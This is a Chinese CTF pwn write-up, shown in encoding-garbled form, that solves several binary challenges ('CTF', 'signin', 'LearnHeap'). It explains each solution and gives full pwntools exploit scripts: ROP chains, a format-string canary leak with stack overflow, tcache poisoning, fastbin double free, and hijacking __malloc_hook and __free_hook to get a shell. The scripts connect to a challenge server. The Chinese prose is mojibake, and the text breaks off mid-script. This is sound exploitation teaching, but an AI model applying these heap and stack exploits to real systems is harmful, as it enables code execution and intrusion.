ä¸¤ä¸ªelfï¼Œæ³¨æ„libcçš„ç‰ˆæœ¬ m_elf = ELF(fn) pop_rdi_ret = 0x0000000000401207 pop_rdx_ret = 0x000000000040120d mov_rsi_rdi_ret = 0x000000000040120f pop_rax_syscall_ret = 0x0000000000401213 ret = 0x000000000040101a read_addr = 0x4012CF gift = 0x00000000004011fb leave_ret = 0x000000000040131c add_rdi_40_ret = 0x00000000004011fe mov_rdi_rsp_ret = 0x0000000000401203 p.clean() payload = \\ b\u0026#34;./flag\\x00\\x00\u0026#34;*0x7 + \\ pg(pop_rdi_ret) + pg(0) + pg(mov_rsi_rdi_ret) +\\ pg(mov_rdi_rsp_ret) + pg(add_rdi_40_ret)*2 +\\ pg(pop_rax_syscall_ret) + pg(0x2) +\\ pg(mov_rsi_rdi_ret) +\\ pg(pop_rdi_ret) + pg(3) +\\ pg(pop_rdx_ret) + pg(0xff)+\\ pg(pop_rax_syscall_ret) + pg(0x0) +\\ pg(pop_rdi_ret) + pg(1) +\\ pg(pop_rax_syscall_ret) + pg(0x1) + pg(0) + b\u0026#34;./flag\\x00\\x00\u0026#34; p.sendline(payload) try: p.interactive() except: p.close() FLAGï¼šflag{6fU9jIyTmarX2EMwJHvQY7SpLuqVbzAN}\nCTF æŸ¥çœ‹æ¶æ„ï¼š\næœ‰ canary æŸ¥çœ‹ ida åç¼–è¯‘ä»£ç ï¼š\nè¿™é¢˜æœ‰ç‚¹å¯„çš„æ˜¯æ²¡æœ‰ main å‡½æ•°ï¼Œåªæœ‰ä¸€ä¸ª label1 ä½œä¸ºç¨‹åºå…¥å£ï¼Œæ‰€ä»¥åªèƒ½çœ‹æ±‡ç¼–ä»£ç ï¼Œå¥½åœ¨ä¸æ˜¯å¾ˆå¤æ‚ï¼š\nå¤§è‡´çš„é€»è¾‘æ˜¯è¦ç»è¿‡ä¸¤ä¸ªæŒ‘æˆ˜ï¼š\nç¬¬ä¸€ä¸ªæŒ‘æˆ˜æ˜¯ç»å…¸çš„é€Ÿç®—æŒ‘æˆ˜ï¼Œç”¨ python çš„ eval å‡½æ•°è§£æè¯»å…¥çš„è®¡ç®—å¼å°±å¯ä»¥äº†\nç¬¬äºŒä¸ªæŒ‘æˆ˜æ˜¯è¦åˆ©ç”¨ç¬¦å·ä½æ¼æ´ï¼Œæˆ‘ä»¬è¾“å…¥ 0x800000000000000c å³å¯\nè¿™é‡Œè¦æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬ä¸èƒ½ç›´æ¥ç”¨ python è¾“å‡ºè¿™ä¸ªæ•°ï¼Œå› ä¸º python ä¼šè‡ªåŠ¨è§£æä¸ºå¾ˆå¤§çš„æ— ç¬¦å·æ•°ã€‚æ¯”è¾ƒç®€å•çš„æ–¹æ³•æ˜¯ä½¿ç”¨ Windows è‡ªå¸¦çš„è®¡ç®—å™¨ï¼š\nè¿˜æœ‰å¦å¤–ä¸€ç§æ–¹æ³•æ˜¯è°ƒç”¨ctypesåº“ï¼Œåˆ›å»ºlong long intç±»å‹çš„å˜é‡ï¼š\noverflow = ctypes.c_longlong(0x800000000000000c) # p.sendline(\u0026#34;-9223372036854775796\u0026#34;) p.sendline(str(overflow.value)) é€šè¿‡ç¬¬äºŒä¸ªæŒ‘æˆ˜åæˆ‘ä»¬å°±å¯ä»¥å¼€å§‹ç¬¬ä¸‰ä¸ªæŒ‘æˆ˜ã€‚ç¬¬ä¸‰ä¸ªæŒ‘æˆ˜æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ç”¨äºæ³„éœ² canaryï¼Œç„¶åå°±æ˜¯ä¸€ä¸ªæ ˆæº¢å‡ºã€‚\néœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ64 ä½ç³»ç»Ÿä¸­çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„å‰äº”ä¸ªå‚æ•°åˆ†åˆ«å­˜åœ¨å¯„å­˜å™¨ RSI/RDX/RCX/R8/R9 ä¸­\nfrom pwn import * from pwn import p64, p32, u32, u64 from LibcSearcher import LibcSearcher from ctypes import c_longlong as longlong pss: bool = True fn: str = \u0026#34;./CTF\u0026#34; libc_name:str = \u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34; port: str = \u0026#34;10074\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;43.248.98.206\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; b* $rebase(0x173B) c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # ä¸¤ä¸ªelfï¼Œæ³¨æ„libcçš„ç‰ˆæœ¬ m_elf = ELF(fn) # libc = ELF(libc_name) p.recvuntil(b\u0026#34;and tell you a secret \u0026#34;) getshell = int(p.recvuntil(b\u0026#34;\\n\u0026#34;)[:-1], 16) codebase = getshell - m_elf.sym[\u0026#39;getshell\u0026#39;] for i in range(50): p.recvuntil(b\u0026#34;num1:\u0026#34;) num1 = p.recvuntil(b\u0026#34;,num2:\u0026#34;)[:-6] num2 = p.recvuntil(b\u0026#34;\\n\u0026#34;)[:-1] p.recvuntil(b\u0026#34;operator:\u0026#34;) oper = p.recvuntil(b\u0026#34;\\n\u0026#34;)[:-1] if b\u0026#34;/\u0026#34; in oper: oper = b\u0026#34;//\u0026#34; answer = eval(num1 + oper + num2) p.clean() p.sendline(str(answer)) p.recvuntil(b\u0026#34;Great Job!\\n\u0026#34;) p.recvuntil(b\u0026#34;Your answer: \\n\u0026#34;) overflow = ctypes.c_longlong(0x800000000000000c) # p.sendline(\u0026#34;-9223372036854775796\u0026#34;) p.sendline(str(overflow.value)) p.recvuntil(b\u0026#34;Your answer: \\n\u0026#34;) p.sendline(str(1)) p.recvuntil(b\u0026#34;Your answer: \\n\u0026#34;) p.sendline(b\u0026#34;%25$p.\u0026#34;) p.recvuntil(b\u0026#34;0x\u0026#34;) canary = int(p.recvuntil(b\u0026#34;.\u0026#34;)[:-1], 16) for i in range(2): p.recvuntil(b\u0026#34;...\u0026#34;) p.recvuntil(b\u0026#34;Your answer: \\n\u0026#34;) payload = b\u0026#34;a\u0026#34;*0x88 + pg(canary) + pg(0) + pg(getshell) p.sendline(payload) p.recvuntil(\u0026#34;Quickly, you are surrounded.\\n\\n\u0026#34;) p.clean() p.interactive() FLAGï¼šflag{114514_V_me_F1fty}\nsignin æ³•ä¸€ï¼šfree å¤§ chunk ç»•è¿‡ tcache binï¼Œç„¶å tcache poison æ£€æŸ¥æ¶æ„ï¼š\næŸ¥çœ‹ ida ä¼ªä»£ç ï¼š\nè®¤çœŸåˆ†æä¸€ä¸‹å°±ä¼šå‘ç°è¿˜æ˜¯ç»å…¸çš„å †èœå•é¢˜\nå…ˆ free æ‰ä¸€ä¸ªå¾ˆå¤§çš„ chunkï¼Œè¿™æ ·è¿™ä¸ª chunk å°±ä¼šç›´æ¥è¿›å…¥ unsorted binï¼ˆè¿™ä¸ªä¸´ç•Œå€¼æˆ‘åœ¨è‡ªå·±çš„ 64 ä½æœºå™¨ä¸Šæµ‹è¯•ï¼Œå¤§æ¦‚æ˜¯ 0x409ï¼‰ï¼Œç„¶åå‡å» main_arena+96ï¼Œå°±å¯ä»¥å¾—åˆ° libc çš„åŸºå€\nå…³äºè¿™ä¸ª main_arena+96 å“ªé‡Œæ¥çš„ï¼Œé¦–å…ˆå°† libc æ‹–å…¥ idaï¼Œæœç´¢ malloc_trimï¼š\nmain_arena çš„åç§»å°±æ˜¯ 0x3ebc40\nç„¶åæˆ‘ä»¬ä½¿ç”¨ gdb æ‰‹åŠ¨ free ä¸€ä¸ªå¤§ chunkï¼ŒæŸ¥çœ‹å†…å­˜\nè¿™é‡Œ pwndbg å¯ä»¥ç”¨ bins å‘½ä»¤ï¼Œä½†æˆ‘çš„ bins å’Œ heap å‡ºç°é—®é¢˜å¯„äº†ï¼Œè¿™é‡Œæ¼”ç¤ºä¸€ä¸‹æ‰‹åŠ¨è®¡ç®— unsorted bin ä¸­åªæœ‰ä¸€ä¸ª chunk æ—¶å­˜å‚¨çš„å€¼å’Œ main_arena çš„åç§»ä¸ºä½•ä¸º 96\n0x00007ffff7dcdca0-0x7ffff79e2000-0x3ebc40=96\nä½¿ç”¨è®¡ç®—å™¨ä¼šå¿«å¾ˆå¤š\nç„¶åæˆ‘ä»¬ free æ‰ä¸€ä¸ªå° chunkï¼Œè®©ä»–è¿›å…¥ tcache binï¼Œæˆ‘ä»¬å°±èƒ½æ›´æ”¹å®ƒçš„ next ä½ï¼Œä»è€Œå¯ä»¥å®ç°ä»»æ„åœ°å€å†™\nè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æ›´æ”¹__malloc_hook çš„å€¼ä¸º one_gadget äº†\nfrom pwn import * from pwn import p64, p32, u32, u64 from LibcSearcher import LibcSearcher pss: bool = True fn: str = \u0026#34;./signin\u0026#34; libc_name:str = \u0026#34;./libc-2.27.so\u0026#34; port: str = \u0026#34;10071\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 ENV = {\u0026#34;LD_PRELOAD\u0026#34;:libc_name} context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;43.248.98.206\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; b* 0x400904 \u0026#34;\u0026#34;\u0026#34;, env=ENV) else: p = process(fn, env=ENV) # ä¸¤ä¸ªelfï¼Œæ³¨æ„libcçš„ç‰ˆæœ¬ m_elf = ELF(fn) libc = ELF(libc_name) main_arena = 0x3EBC40 main_off = 96 chunks = 0x6020f0 # mallocçš„indexä¸èƒ½ç›´æ¥æ§åˆ¶ def allocate(size: int): p.clean() p.sendline(b\u0026#34;1\u0026#34;) p.clean() p.sendline(str(size)) # freeçš„æ ‡ç­¾å°äºä¸ƒ # ä¸€å…±åªèƒ½freeä¸¤æ¬¡ def free(index: int): p.clean() p.sendline(b\u0026#34;2\u0026#34;) p.clean() p.sendline(str(index)) def change(index: int, data: str): p.clean() p.sendline(b\u0026#34;3\u0026#34;) p.clean() p.sendline(str(index)) p.clean() p.sendline(data) def show(index: int): p.clean() p.sendline(b\u0026#34;4\u0026#34;) p.clean() p.sendline(str(index)) p.recvuntil(b\u0026#34;content: \u0026#34;) return p.recvuntil(b\u0026#34;\\n\u0026#34;)[:-1] allocate(0x1000) # 1 allocate(0x80) allocate(0x80) free(0) libcbase = u64(show(0)[:9].ljust(0x8, b\u0026#34;\\x00\u0026#34;)) - (main_arena + main_off) success(f\u0026#34;libcbase =\u0026gt; {hex(libcbase)}\u0026#34;) system_addr = libcbase + libc.sym[\u0026#39;system\u0026#39;] malloc_hook_addr = libcbase + libc.sym[\u0026#39;__malloc_hook\u0026#39;] one_gadget = libcbase + 0x10a2fc next_chunk = 0x23 free(1) payload = pg(malloc_hook_addr - next_chunk) change(1, payload) allocate(0x80) allocate(0x7f) # gdb.attach(p) payload = b\u0026#34;0\u0026#34;*0x23 + pg(one_gadget) change(4, payload) allocate(0x10) p.clean() p.interactive() FLAGï¼šflag{cd02sdyy9hfggsyo1wecd8ad2elttilnaj22}\næ³•äºŒï¼šé€šè¿‡stderræ³„éœ²libcï¼Œç„¶åæ›´æ”¹chunksæŒ‡é’ˆ è¿™ä¸ªæ–¹æ³•çš„è¦ç‚¹åœ¨äºï¼Œå› ä¸ºä½¿ç”¨äº†setbufå‡½æ•°ï¼Œæ‰€ä»¥stdinã€stdoutã€stderrä¼šä»¥å…¨å±€å˜é‡çš„å½¢å¼å­˜åœ¨ç¨‹åºä¸­ã€‚ æˆ‘ä»¬å¯ä»¥é€šè¿‡tcache poisoningæ¥å°†è¿™ä¸ªchunkåˆ†é…åˆ°è¿™ä¸ªåœ°æ–¹ï¼Œç„¶åå› ä¸ºç¨‹åºä¸­ä¿å­˜æ‰€æœ‰åˆ†é…ç©ºé—´çš„æŒ‡é’ˆchunksä¹Ÿæ˜¯å…¨å±€å˜é‡ï¼Œæ‰€ä»¥è¿™ä¸ªchunkä¹Ÿå¯ä»¥æ›´æ”¹chunksçš„å€¼ï¼Œè¿™æ ·å­å°±å¯ä»¥å°†å…¶æŒ‡å‘__malloc_hookï¼Œè¿™æ ·å­å°±èƒ½å¤Ÿå°†å®ƒçš„å€¼æ”¹ä¸ºone_gadgetäº†\nè¿™ä¸ªæ–¹æ³•æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯åˆ†é…åœ¨stderrå¤„çš„chunkä¼šå°†countç½®é›¶ï¼Œè¿™æ˜¯å› ä¸ºåˆ†é…çš„ä½ç½®åˆšå¥½è®©countåœ¨å®ƒçš„bkä½ï¼Œè€Œmallocä¼šå°†bkç½®é›¶ï¼š ^962996\nä¸”çœ‹ä¸‹é¢è¿™ä¸ªç¨‹åºï¼š\n#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; int main(void){ int *a = (int *)malloc(0x80); int *b = (int *)malloc(0x80); free(a); a[2] = 1; a = (int *)malloc(0x80); printf(\u0026#34;%d\\n\u0026#34;, a[2]); } ç»“æœæ˜¯0ï¼š\nè‹¥å°†a[2]æ”¹ä¸ºa[1]ï¼Œåˆ™ç»“æœä¸º1ï¼š\nè¯´æ˜è‡³å°‘å¯¹tcache binä¸­çš„chunkæ¥è¯´ï¼Œbkä¼šè¢«ç½®é›¶è€Œfdä¸ä¼š\nè™½ç„¶è¿™å¯èƒ½ä¼šéšç€libcç‰ˆæœ¬çš„æ”¹å˜è€Œæ”¹å˜ï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬åšé¢˜çš„æ—¶å€™å‘ç°bkè¢«ç½®é›¶äº†ï¼Œè‡³å°‘æˆ‘ä»¬å¤šäº†ä¸€ç§å¯è€ƒè™‘çš„å¯èƒ½\nfrom pwn import * path = \u0026#34;/home/linux/0/pwn/signin\u0026#34; stderr = 0x6020A0 context(log_level = \u0026#34;debug\u0026#34;, arch = \u0026#34;amd64\u0026#34;, os = \u0026#34;linux\u0026#34;) #p = process(path) #p = gdb.debug(path, \u0026#34;b *(main+0xC1)\u0026#34;) p = remote(\u0026#34;43.248.98.206\u0026#34;, \u0026#34;10071\u0026#34;) def add(size): p.sendlineafter(\u0026#34;choice: \u0026#34;, \u0026#34;1\u0026#34;)\tp.sendlineafter(\u0026#34;size: \u0026#34;, str(size)) def edit(index, content): p.sendlineafter(\u0026#34;choice: \u0026#34;, \u0026#34;3\u0026#34;) p.sendlineafter(\u0026#34;idx: \u0026#34;, str(index)) p.sendlineafter(\u0026#34;data: \u0026#34;, content) def display(index): p.sendlineafter(\u0026#34;choice: \u0026#34;, \u0026#34;4\u0026#34;) p.sendlineafter(\u0026#34;idx: \u0026#34;, str(index)) def free(index): p.sendlineafter(\u0026#34;choice: \u0026#34;, \u0026#34;2\u0026#34;) p.sendlineafter(\u0026#34;idx: \u0026#34;, str(index)) add(0x80) #0 add(0x80) #1 free(0) free(1) edit(1, p64(stderr)) #tcache poisoning add(0x80) #2 add(0x80) #0 0x6020A0 When mallocing chunk on 0x6020A0, the \u0026#34;idx\u0026#34; on .bss will change into 0. Actually I don\u0026#39;t know why. But the index of this chunk is 0. display(0) #leak libc p.recvuntil(\u0026#34;content: \u0026#34;) libc = int.from_bytes(p.recv(6), \u0026#34;little\u0026#34;) - 0x3EC680 print(\u0026#34;libc =\u0026#34;, hex(libc)) malloc_hook = libc + 0x3EBC30 print(\u0026#34;malloc_hook =\u0026#34;, hex(malloc_hook)) one_gadget = [libc + 0x4f302, libc + 0x10a2fc] edit(0, flat(0, 0, 0, 0, malloc_hook, 0x80)) #change the pointer save in chunks[0] into malloc_hook edit(0, flat(one_gadget[1])) #write one gadget add(0xA0) #trigger malloc_hook p.interactive() æ³•ä¸‰ï¼šæ›´æ”¹chanceåå°†__free_hookæ”¹ä¸ºsystemåœ°å€ï¼Œåœ¨chunkå†…å¡«å…¥/bin/shåfreeæ‰ libc-2.27.soé‡Šæ”¾ç¬¦åˆå¤§å°çš„å †å—ä¼šè¿›å…¥tcachebinä¸­\nä½†æ˜¯å› ä¸ºchanceçš„é™åˆ¶ï¼Œç¨‹åºè§„å®šåªèƒ½é‡Šæ”¾ä¸¤æ¬¡å †å—ï¼Œä½†åˆ©ç”¨tcachebinçš„ç‰¹æ€§å¯ä»¥æ”¹å˜é‡Šæ”¾æ¬¡æ•°\næ”¹å˜åå¯ä»¥é€šè¿‡å…ˆé‡Šæ”¾å¤§å †å—è¿›å…¥unsortedbinï¼Œåˆ©ç”¨å®ƒçš„ç‰¹æ€§å’ŒUAFå¸¦å‡ºmain_arenaï¼Œç„¶åé€šè¿‡å›ºå®šåç§»å¯ä»¥ç®—å‡ºlibcåŸºåœ°å€\nå†é‡Šæ”¾ä¸¤æ¬¡å †å—è¿›å…¥tcache binï¼Œæ”¹å˜é“¾é¦–éƒ¨çš„å †å—çš„fdæŒ‡å‘__free_hookï¼Œå†ç”³è¯·ä¸¤ä¸ªåŒæ ·å¤§å°çš„å †å—ï¼Œå†å°†__free_hooké‡Œçš„å€¼æ”¹ä¸ºsystemçš„ï¼Œæœ€åé€šè¿‡é‡Šæ”¾\u0026quot;/bin/sh\u0026quot;çš„å †å—å³å¯å®ç°system('/bin/sh')ï¼Œè¿˜æœ‰ä¸ªåœ°æ–¹å¾—æ³¨æ„ï¼Œåªèƒ½æ‰“å°8ä¸ªå †å—çš„å†…å®¹ï¼Œæ‰€ä»¥ç”³è¯·å †å—çš„æ•°é‡è¦æŠŠæ§å¥½\nfrom pwn import * context(log_level=\u0026#39;debug\u0026#39;,arch=\u0026#39;amd64\u0026#39;,os=\u0026#39;linux\u0026#39;) #p=process(\u0026#39;signin\u0026#39;) libc=ELF(\u0026#39;libc-2.27.so\u0026#39;) p=remote(\u0026#39;43.248.98.206\u0026#39;,10071) elf=ELF(\u0026#39;signin\u0026#39;) def add(size): p.sendlineafter(\u0026#39;choice: \u0026#39;,b\u0026#39;1\u0026#39;) p.sendlineafter(\u0026#39;size: \u0026#39;,str(size)) def free(index): p.sendlineafter(\u0026#39;choice: \u0026#39;,b\u0026#39;2\u0026#39;) p.sendlineafter(\u0026#39;idx: \u0026#39;,str(index)) def xiugai(index,data): p.sendlineafter(\u0026#39;choice: \u0026#39;,b\u0026#39;3\u0026#39;) p.sendlineafter(\u0026#39;idx: \u0026#39;,str(index)) p.sendafter(\u0026#39;data: \u0026#39;,data) def pri(index): p.sendlineafter(\u0026#39;choice: \u0026#39;,b\u0026#39;4\u0026#39;) p.sendlineafter(\u0026#39;idx: \u0026#39;,str(index)) add(16) add(16) free(0) free(1) payload=p64(0x602070) xiugai(1,payload) add(16) add(16) xiugai(3,b\u0026#39;100\u0026#39;) # å¢åŠ chanceæ¬¡æ•° add(0x500) # è¿›å…¥unsortedbin add(16) # é˜²æ­¢ä¸top_chunkç›¸è¿ free(4) pri(4) # å¸¦å‡ºmain_arenaåœ°å€ p.recvuntil(\u0026#39;content: \u0026#39;) libc_addr=u64(p.recv(6).ljust(8, b\u0026#39;\\x00\u0026#39;))-0x3ebca0 success(\u0026#39;libc:\u0026#39;+hex(libc_addr)) #gdb.attach(p) free(0) free(2) xiugai(2,p64(libc.symbols[\u0026#39;__free_hook\u0026#39;]+libc_addr)) add(16) add(16) xiugai(7,p64(libc.symbols[\u0026#39;system\u0026#39;]+libc_addr)) xiugai(6,b\u0026#39;/bin/sh\\x00\u0026#39;) free(6) #gdb.attach(p) p.interactive() LearnHeap æŸ¥çœ‹ç¨‹åºæ¶æ„ æŸ¥çœ‹idaåç¼–è¯‘ä»£ç  int __cdecl __noreturn main(int argc, const char **argv, const char **envp) { int ch_0; // [rsp+8h] [rbp-18h] BYREF int i; // [rsp+Ch] [rbp-14h] char *p; // [rsp+10h] [rbp-10h] unsigned __int64 v6; // [rsp+18h] [rbp-8h] v6 = __readfsqword(0x28u); init(); p = (char *)malloc(0x20uLL); puts(\u0026#34;Welcome to LearnHeap!\u0026#34;); puts(\u0026#34;This is a guided learning test.\u0026#34;); puts(\u0026#34;In this test, gdb and pwndbg may help you.\u0026#34;); puts(byte_176B); puts(\u0026#34;Now you will see a very regular heap question. add() show() delete()\u0026#34;); puts(\u0026#34;Step 1. Leak Libc address.\\nStep 2. double free.\\nStep 3. hijacking __free_hook\\nStep 4. get shell!\u0026#34;); puts(\u0026#34;Now, let\u0026#39;s start!\u0026#34;); Step1(); Step2(); Step3(); Step4(); *free_hook = 0LL; memset(p - 592, 0, 0x240uLL); for ( i = 67; i; --i ) malloc(0x10uLL); memset(book, 0, sizeof(book)); puts(\u0026#34;Now Let\u0026#39;s attack.\u0026#34;); while ( 1 ) { puts(\u0026#34;Welcome~!\\n1.add\\n2.show\\n3.delete\u0026#34;); printf(\u0026#34;\u0026gt; \u0026#34;); __isoc99_scanf(\u0026#34;%d\u0026#34;, \u0026amp;ch_0); switch ( ch_0 ) { case 2: show(); break; case 3: delete(); break; case 1: add(); break; default: puts(\u0026#34;error.\u0026#34;); break; } } } step1 æ³„éœ²libcåŸºå€ è¿™é‡Œè°ƒç”¨äº†addå’Œdeleteå‡½æ•°ï¼š å› æ­¤æˆ‘ä»¬ç¼–å†™çš„addå’Œdeleteå‡½æ•°:\ndef add(index: int, size: int, content, flag: bool = False): if flag: p.clean() p.sendline(b\u0026#34;1\u0026#34;) p.clean() p.sendline(str(index)) p.clean() p.sendline(str(size)) p.clean() p.sendline(content) def delete(index: int, flag: bool = False): if flag: p.clean() p.sendline(b\u0026#34;3\u0026#34;) p.clean() p.sendline(str(index)) ç„¶åæˆ‘ä»¬åˆ†é…ä¸€ä¸ªå¤§chunkè¿›å…¥unsorted binï¼Œè¿™æ ·å®ƒçš„fdæŒ‡é’ˆä¼šè¢«è®¾ä¸ºmain_arena+96ï¼Œä»è€Œæˆ‘ä»¬å¯ä»¥è·å¾—libcåŸºå€\néœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè™½ç„¶æ²¡æœ‰showå‡½æ•°ï¼Œä½†æ˜¯åœ¨addå‡½æ•°çš„æœ€åä¼šå°†è¾“å…¥çš„å†…å®¹putså‡ºæ¥\nåˆå› ä¸ºmallocä¼šé¦–å…ˆä»å„ä¸ªbinä¸­å¯»æ‰¾åˆé€‚çš„chunkï¼Œæ‰€ä»¥æˆ‘ä»¬ç¬¬ä¸‰æ¬¡addçš„æ—¶å€™ä¼šåˆ†é…åˆ°è¿›å…¥unsorted binä¸­çš„é‚£ä¸ªå¤§chunkï¼ˆæˆ–å®ƒçš„ä¸€éƒ¨åˆ†ï¼‰ï¼Œè€Œmallocä¸ä¼šå°†å†…å®¹æ¸…é›¶ï¼ˆè‡³å°‘fdæŒ‡é’ˆä¸æ¸…é›¶ï¼Œè¯¦æƒ…è§æ­¤ï¼‰\næ‰€ä»¥ï¼Œæœ€åæˆ‘ä»¬putså‡ºæ¥çš„ï¼Œå°±æ˜¯main_arena+96çš„æŒ‡é’ˆ\næ³¨æ„ï¼Œlibc2.26æ²¡æœ‰tcache binï¼Œæ‰€ä»¥æ³¨æ„æƒ³è¦è¿›å…¥fastbinçš„chunkå¤§å°ï¼ˆé»˜è®¤æœ€å¤§å¤§å°ä¸º(64 * SIZE_SZ / 4)ï¼Œ32 ä½ä¸º 64=0x40 å­—èŠ‚ï¼Œ64 ä½ä¸º 128=0x80 å­—èŠ‚ï¼‰\nadd(0, 1071, b\u0026#34;\u0026#34;) # å¤§äº1072ä¼šé€€å‡ºï¼Œä½†æ˜¯1033å°±å¯ä»¥è¿›å…¥unsorted bin add(1, 0x10, b\u0026#34;\u0026#34;) delete(0) add(2, 0x10, b\u0026#34;\u0026#34;) p.recvuntil(b\u0026#34;Your book: \\n\u0026#34;) main_arena = 0x3dac20 main_off = 1002 libc_base = u64(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) - (main_arena + 1002) system_addr = libc_base + libc.sym[\u0026#39;system\u0026#39;] p.sendlineafter(\u0026#34;Let\u0026#39;s make a test.\\n\u0026#34;, hex(system_addr)) step2 double free æ„å»ºå¾ªç¯mallocé“¾ å› ä¸ºfastbinåœ¨libc2.26ä¸­å¯¹double freeçš„æ£€æŸ¥åªæ˜¯å•çº¯åœ°æ£€æŸ¥è¡¨å¤´çš„chunkæ˜¯å¦å’Œæ­£åœ¨freeçš„chunkä¸€æ ·ï¼Œæ‰€ä»¥åªè¦æˆ‘ä»¬åœ¨double freeä¸­é—´éšä¾¿freeä¸€ä¸ªåˆ«çš„chunkï¼Œå®ƒå°±æ£€æŸ¥ä¸åˆ°äº†ï¼ˆæ–°ç‰ˆæœ¬ä¸è¡Œï¼‰\nå¦‚æœæ˜¯2.27~2.28ä¸­çš„tcache binå°±æ›´å¥½åŠäº†ï¼Œå› ä¸ºå…¶æ ¹æœ¬æ²¡æœ‰ä»»ä½•æ£€æŸ¥ï¼Œç›´æ¥freeä¸¤æ¬¡å³å¯ è€Œå¦‚æœæ˜¯2.29~2.31ï¼Œtcache_entryå¢åŠ äº†ä¸€ä¸ªattributeï¼Œkeyå­—æ®µï¼Œè¦ä¹ˆæ›´æ”¹keyå­—æ®µç„¶ådouble freeï¼Œè¦ä¹ˆä½¿ç”¨fastbin double freeï¼Œè¯¦æƒ…è§æ­¤æ–‡ç« \nå¤§å¤šæ•°ç¨‹åºç»å¸¸ä¼šç”³è¯·ä»¥åŠé‡Šæ”¾ä¸€äº›æ¯”è¾ƒå°çš„å†…å­˜å—ã€‚å¦‚æœå°†ä¸€äº›è¾ƒå°çš„ chunk é‡Šæ”¾ä¹‹åå‘ç°å­˜åœ¨ä¸ä¹‹ç›¸é‚»çš„ç©ºé—²çš„ chunk å¹¶å°†å®ƒä»¬è¿›è¡Œåˆå¹¶ï¼Œé‚£ä¹ˆå½“ä¸‹ä¸€æ¬¡å†æ¬¡ç”³è¯·ç›¸åº”å¤§å°çš„ chunk æ—¶ï¼Œå°±éœ€è¦å¯¹ chunk è¿›è¡Œåˆ†å‰²ï¼Œè¿™æ ·å°±å¤§å¤§é™ä½äº†å †çš„åˆ©ç”¨æ•ˆç‡ã€‚å› ä¸ºæˆ‘ä»¬æŠŠå¤§éƒ¨åˆ†æ—¶é—´èŠ±åœ¨äº†åˆå¹¶ã€åˆ†å‰²ä»¥åŠä¸­é—´æ£€æŸ¥çš„è¿‡ç¨‹ä¸­ã€‚ å› æ­¤ï¼Œptmalloc ä¸­ä¸“é—¨è®¾è®¡äº† fast binï¼Œå¯¹åº”çš„å˜é‡å°±æ˜¯ malloc state ä¸­çš„ fastbinsY\néœ€è¦æ³¨æ„çš„æ˜¯ï¼Œèƒ½è¿›å…¥fastbinä¸­çš„chunkä¼šç›´æ¥è¿›å…¥fastbinï¼Œå°½ç®¡å®ƒå’Œtop chunkç›¸é‚»ä¹Ÿä¸ä¼šåˆå¹¶ï¼Œè§ctfwiki\ndelete(1) delete(2) delete(1) p.sendlineafter(\u0026#34;what sizes you make?\\n\u0026#34;, str(0x10)) step3 æ›´æ”¹fdæŒ‡é’ˆæŒ‡å‘free_hookï¼Œå¡«å…¥å±é™©å‡½æ•°åœ°å€ è¿™æ—¶æˆ‘ä»¬å› ä¸ºè·å¾—äº†ä¸€ä¸ªå¾ªç¯çš„mallocé“¾ï¼Œå¯ä»¥æ— é™åœ°mallocï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨ç¬¬ä¸€æ¬¡addæ—¶æ›´æ”¹fdæŒ‡é’ˆï¼ŒæŒ‡å‘free_hookï¼Œç„¶åå°†å…¶æ”¹ä¸ºsystemçš„åœ°å€\næˆ‘ä»¬å°†\u0026quot;/bin/sh\u0026quot;å­˜åœ¨ä¸€ä¸ªchunkä¸­ï¼Œè‹¥__free_hookçš„å€¼æ”¹ä¸ºäº†systemï¼Œåˆ™åŸæœ¬çš„free(\u0026quot;/bin/sh\u0026quot;)å°±ä¼šäº§ç”Ÿsystem(\u0026quot;/bin/sh\u0026quot;)çš„æ•ˆæœ\nadd(3, 0x10, p64(m_elf.sym[\u0026#39;free_hook\u0026#39;])) add(4, 0x10, b\u0026#34;/bin/sh\\x00\u0026#34;) add(5, 0x10, b\u0026#34;a\u0026#34;) add(6, 0x10, p64(system_addr)) step4 getshell (fake) è¿™æ—¶å€™æˆ‘ä»¬delete(4)å°±å¯ä»¥äº†\ndelete(4) çœŸå®åœºæ™¯getshellï¼ å°±æ˜¯æŠŠä¸Šé¢çš„æ€è·¯å¤ç°ä¸€é\nä¸è¿‡ä¸åŒçš„æ˜¯æˆ‘ä»¬ä¸ç”¨leak libcäº†ï¼Œå› ä¸ºä¸Šé¢æˆ‘ä»¬å·²ç»è·å¾—äº†libcåŸºå€\nç›´æ¥æ„å»ºmallocé“¾ç„¶åfastbin attackå³å¯\n# flagè®¾ä¸ºTrue add(7, 0x10, b\u0026#34;\u0026#34;, True) add(8, 0x10, b\u0026#34;\u0026#34;, True) delete(7, True) delete(8, True) delete(7, True) add(9, 0x10, p64(libc.sym[\u0026#39;__free_hook\u0026#39;]+libc_base), True) add(10, 0x10, b\u0026#34;/bin/sh\\x00\u0026#34;, True) add(11, 0x10, b\u0026#34;a\u0026#34;, True) add(12, 0x10, p64(system_addr), True) delete(10, True) p.interactive() å®Œæ•´exp from pwn import * from pwn import p64, p32, u32, u64 from LibcSearcher import LibcSearcher pss: bool = False fn: str = \u0026#34;./learnheap\u0026#34; libc_name:str = 